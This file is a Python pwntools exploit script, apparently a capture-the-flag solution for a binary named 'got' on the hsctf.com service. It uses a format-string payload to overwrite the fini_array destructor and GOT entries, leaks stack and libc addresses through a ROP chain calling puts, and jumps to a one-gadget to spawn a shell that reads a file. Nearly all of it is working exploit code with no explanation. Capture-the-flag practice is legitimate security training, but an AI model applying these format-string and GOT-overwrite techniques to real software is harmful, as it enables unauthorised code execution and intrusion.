from pwn import *

e = ELF("./got")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.hsctf.com", 5004)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

dtor = e.symbols["__do_global_dtors_aux_fini_array_entry"]
ret =  0x00401434 

writes = {
  dtor: e.symbols["main"],
  e.got["alarm"]: ret,
}


pay = fmtstr_payload(9, writes, numbwritten=13)
print(len(pay))
p.sendlineafter("sumpfink", "%32$llx;".ljust(8, " ") + pay)

p.recvuntil("\"")
leak = int(p.recvuntil(";", drop=True), 16) + 0x7ffe0bb50938 - 0x7ffe0bb50c98
print(hex(leak))

p.sendlineafter("worked!!", "%10$32s".ljust(0x10, "\x00") + p64(leak))
debug()

p.send(p64(0x401433) + p64(e.got["puts"]) + p64(e.symbols["puts"]) + p64(0x40131d))

libc_leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["puts"]

p.sendline(p64(libc_leak + 0x10a38c))
p.sendline("cat acknowledgements.txt")

p.interactive()
